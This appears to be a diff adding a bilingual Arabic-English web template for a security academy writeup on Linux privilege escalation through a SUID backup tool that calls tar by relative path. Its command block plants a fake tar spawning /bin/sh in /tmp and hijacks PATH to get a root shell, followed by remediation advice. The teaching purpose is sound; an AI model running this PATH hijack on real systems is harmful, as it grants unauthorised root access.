@@ -1,0 +1,66 @@
+{% extends "main/academy/base.html" %}
+
+{% block title %}Linux SUID Root Writeup{% endblock %}
+
+{% block content %}
+<div class="page-hero">
+  <h1 class="page-title">ترقية صلاحيات لينكس عبر ملفات SUID</h1>
+  <p class="page-title-en">Linux Local Privilege Escalation via SUID Binaries</p>
+  <span class="severity-pill pill-high">HIGH</span>
+  <span class="severity-pill pill-medium">Bounty: $1,000</span>
+</div>
+
+<div class="section-card">
+  <h2>Overview / نظرة عامة</h2>
+  <div class="bilingual-block">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>ملفات SUID هي ملفات تنفيذية تعمل بصلاحيات مالكها الفعلي (غالباً root) بدلاً من المستخدم الحالي. يوضح هذا التقرير كيفية اكتشاف ملف SUID غير آمن واستغلاله لتخطي العزل والحصول على shell بصلاحيات كاملة.</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>SUID binaries allow users to execute files with owner privileges. This writeup documents how identifying a misconfigured custom SUID utility led to local privilege escalation on a Linux target.</p>
+    </div>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>Exploitation Steps / خطوات الاستغلال</h2>
+  <ol class="steps-list">
+    <li>البحث عن ملفات SUID النشطة على النظام باستخدام أمر <code>find</code>.</li>
+    <li>تحديد ملف مخصص <code>/usr/local/bin/backup-tool</code> يعمل بصلاحيات root.</li>
+    <li>لاحظ أن التطبيق يقوم باستدعاء أداة <code>tar</code> بدون مسار مطلق (Relative Path).</li>
+    <li>استغلال ثغرة PATH Injection بإنشاء ملف <code>tar</code> مزيف في المجلد <code>/tmp</code> وإضافته لمتغير البيئة <code>PATH</code>.</li>
+    <li>تشغيل البرنامج ليعمل ملف الـ tar المزيف بصلاحيات root ويمنحنا shell.</li>
+  </ol>
+</div>
+
+<div class="section-card">
+  <h2>Exploit Commands / أوامر الاستغلال</h2>
+  <div class="cmd-block">
+    <div class="cmd-bar">
+      <span>PATH Hijacking Exploit / استغلال متغير البيئة</span>
+      <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    </div>
+    <pre>cd /tmp
+echo "/bin/sh" > tar
+chmod +x tar
+export PATH=/tmp:$PATH
+/usr/local/bin/backup-tool</pre>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>Remediation / التخفيف والحماية</h2>
+  <div class="bilingual-block">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>احرص على كتابة المسارات المطلقة (Absolute Paths) في الأوامر والسكربتات التي تعمل بصلاحيات root، وتجنب استخدام SUID للملفات والسكربتات المخصصة إذا لم يكن ذلك ضرورياً.</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Always define absolute paths (e.g. <code>/bin/tar</code>) in root scripts, and avoid setting SUID bits on custom utilities without rigorous auditing.</p>
+    </div>
+  </div>
+</div>
+{% endblock %}
